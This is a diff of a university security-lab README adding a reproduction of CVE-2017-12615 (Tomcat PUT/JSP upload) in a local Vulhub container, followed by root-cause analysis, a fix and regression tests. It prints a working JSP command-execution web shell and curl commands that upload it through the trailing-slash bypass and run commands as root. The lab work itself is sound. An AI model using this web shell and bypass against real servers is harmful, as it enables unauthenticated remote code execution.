@@ -28,6 +28,10 @@ Real CVE Vulnerability Analysis** (HDU Internet Security).
 ```
 .
 ├── .github/workflows/ci.yml   # CI: tests + Bandit (SAST) + pip-audit (SCA)
+├── vulhub-fix/                # fixed Dockerfile/compose for CVE-2017-12615
+├── report/                    # full laboratory report (PDF + HTML source)
+├── docs/cve/evidence/         # raw output from the CVE reproduction
+├── docs/screenshots/          # CI and CVE screenshots
 ├── app/
 │   ├── __init__.py            # application factory, configuration, security headers
 │   ├── auth.py                # POST /auth/login
@@ -339,24 +343,167 @@ Pipeline run and artifacts:
 
 <!-- Screenshots of the Actions reports are stored under docs/screenshots/. -->
 
-## 8. CVE analysis with Vulhub
+## 8. CVE analysis: CVE-2017-12615 (Tomcat DefaultServlet PUT / JSP upload)
 
-> Status: to be completed in the next stage of the laboratory work.
-> The selected environment, reproduction steps, root-cause analysis, fix, and
-> regression evidence will be added here once the vulnerable service has been
-> run and verified.
+### 8.1 Selected vulnerability
 
-Planned content (required by the assignment):
+| Property | Value |
+|---|---|
+| CVE | **CVE-2017-12615** — Apache Tomcat `DefaultServlet` PUT / JSP upload remote code execution |
+| CVSS v3.1 | **8.1 High** — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
+| Vulnerable component | Tomcat `DefaultServlet`, HTTP PUT enabled via `readonly=false` |
+| Affected releases | NVD: Tomcat 7.0.0–7.0.79 on Windows. Vulhub demonstrates the same PUT/JSP-upload weakness on **Tomcat 8.5.19**. The related bypass **CVE-2017-12617** affects 8.5.0–8.5.22 and was fixed in 8.5.23. |
+| Vulhub environment | `tomcat/CVE-2017-12615` |
+| Impact | Unauthenticated write of an executable JSP into the web root → remote code execution as the Tomcat user (root in this image) |
 
-1. Selected CVE (ID + description) and why it was chosen.
-2. Reproduction sequence with commands/HTTP requests and screenshots.
-3. Root-cause analysis in our own words.
-4. Applied fix (Dockerfile / docker-compose.yml / source) and why it works.
-5. Proof that the exploit no longer works, plus regression testing.
-6. The fixed configuration files, attached under `vulhub-fix/`.
+It was chosen because the reproduction needs only a build plus two HTTP
+requests, the principle is simple (insecure DefaultServlet configuration plus
+an incomplete filename-suffix check), and the impact is unambiguous RCE.
+
+### 8.2 Vulnerable environment and reproduction
+
+```bash
+docker compose -f vulhub/tomcat/CVE-2017-12615/docker-compose.yml \
+  --project-directory vulhub/tomcat/CVE-2017-12615 up -d --build
+```
+
+> The configured Docker Hub mirrors rejected the `vulhub/tomcat:8.5.19`
+> reference (403 / not in allowlist). The official `tomcat:8.5.19-jre8` image
+> was pulled and locally tagged as `vulhub/tomcat:8.5.19`; the Vulhub
+> Dockerfile was used unchanged and still injects `readonly=false`.
+
+Confirmed environment:
+
+```
+Server version: Apache Tomcat/8.5.19
+Server built:   Jul 24 2017 21:01:14 UTC
+119:<init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Payload (a minimal JSP command runner):
+
+```jsp
+<%@ page contentType="text/plain;charset=UTF-8" pageEncoding="UTF-8" %>
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null && cmd.length() > 0) {
+        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+        InputStream in = p.getInputStream();
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buf = new byte[4096];
+        int n;
+        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
+        response.getWriter().print(out.toString("UTF-8"));
+    }
+%>
+```
+
+**Step 1 — upload the JSP through PUT.** The trailing slash bypasses the
+`.jsp` suffix check while the filesystem creates `shell.jsp`:
+
+```bash
+curl -i -X PUT "http://127.0.0.1:8080/shell.jsp/" \
+     --data-binary "@shell.jsp" \
+     -H "Content-Type: application/octet-stream"
+# HTTP/1.1 201
+```
+
+**Step 2 — execute commands as root:**
+
+```bash
+curl "http://127.0.0.1:8080/shell.jsp?cmd=id"
+# uid=0(root) gid=0(root) groups=0(root)
+
+curl -G "http://127.0.0.1:8080/shell.jsp" \
+     --data-urlencode "cmd=cat /etc/passwd"
+# root:x:0:0:root:/root:/bin/bash ...
+
+curl -G "http://127.0.0.1:8080/shell.jsp" \
+     --data-urlencode "cmd=touch /tmp/pwned_by_cve_2017_12615; ls -l /tmp/pwned_by_cve_2017_12615"
+# -rw-r----- 1 root root 0 ... /tmp/pwned_by_cve_2017_12615
+```
+
+![Reproduction of CVE-2017-12615](docs/screenshots/cve-vulnerable.png)
+
+### 8.3 Root cause analysis
+
+1. **Insecure configuration.** `DefaultServlet` is mapped to `/` and its
+   secure default is `readonly=true`. The Dockerfile explicitly injects
+   `readonly=false`, turning a read-only static-file servlet into an
+   unauthenticated file-upload interface.
+2. **Incomplete dangerous-extension check (canonicalisation flaw, CWE-434).**
+   Tomcat rejects filenames ending in `.jsp`, but the check operates on the
+   request path without reconciling it with the path the filesystem will
+   create. A trailing `/` bypasses the suffix test; the OS removes the trailing
+   separator when creating the file, so a JSP lands in the web root.
+3. **The uploaded file is executable by design.** The file is written into
+   `webapps/ROOT`; a later GET is compiled and executed by the JSP servlet
+   without any additional authorisation.
+4. **Root process (aggravating factor).** Tomcat runs as root in this image,
+   so the web shell escalates to root inside the container.
+
+In short: the server was configured to accept writes it should never accept,
+and the only remaining protection — a filename suffix blacklist — was bypassed
+because the server validated one representation of the path while the
+filesystem used another.
+
+### 8.4 Applied fix
+
+The fix is in [`vulhub-fix/`](vulhub-fix/) (`Dockerfile`,
+`docker-compose.yml`, `diff.patch`, `README.md`):
+
+1. **Version upgrade:** `tomcat:8.5.23-jre8`. Tomcat 8.5.23 contains the fix
+   for **CVE-2017-12617**, the bypass of the CVE-2017-12615 remediation
+   (affected 8.5.0–8.5.22).
+2. **Configuration fix:** the insecure `readonly=false` override is removed;
+   `DefaultServlet` keeps its secure default `readonly=true`, so PUT/DELETE are
+   rejected.
+3. **Defence in depth:** keep PUT disabled on static-file servlets, run Tomcat
+   as a non-root user, and monitor the web root for unexpected files.
+
+```diff
+-FROM vulhub/tomcat:8.5.19
+-
+-RUN cd /usr/local/tomcat/conf \
+-    && LINE=$(nl -ba web.xml | grep '<load-on-startup>1' | awk '{print $1}') \
+-    && ADDON="<init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>" \
+-    && sed -i "$LINE i $ADDON" web.xml
++FROM tomcat:8.5.23-jre8
++# readonly remains at its secure default (true); PUT/DELETE are rejected.
+```
+
+### 8.5 Proof of elimination and regression testing
+
+The vulnerable environment was stopped (`docker compose down`) and the fixed
+environment rebuilt. Repeating the exact same steps gives:
+
+```
+Server version: Apache Tomcat/8.5.23
+no readonly init-param (secure default true)
+
+PUT /shell.jsp/           -> HTTP/1.1 403 Forbidden
+GET  /shell.jsp?cmd=id    -> HTTP 404
+GET  /                    -> HTTP 200   (regression)
+GET  /docs/               -> HTTP 200   (regression)
+```
+
+The webshell is never written, so it cannot be executed. At the same time the
+default Tomcat page and the documentation webapp still work, which demonstrates
+that the fix did not break normal functionality.
+
+![Verification of the fix](docs/screenshots/cve-fixed.png)
+
+Raw command output is committed under [`docs/cve/evidence/`](docs/cve/evidence/).
+The full report is [`report/Work1_Report.pdf`](report/Work1_Report.pdf).
 
 ## 9. Repository
 
 * Public repository: <https://github.com/ynjlzxpl/hdu-internet-security-work1>
 * Last successful pipeline:
   <https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/runs/39352597970>
+* Laboratory report: [`report/Work1_Report.pdf`](report/Work1_Report.pdf)
+* Fix folder: [`vulhub-fix/`](vulhub-fix/) (Dockerfile, docker-compose.yml, diff.patch)
+* CVE reproduction evidence: [`docs/cve/evidence/`](docs/cve/evidence/)
+* CI security reports: [`docs/ci/`](docs/ci/)
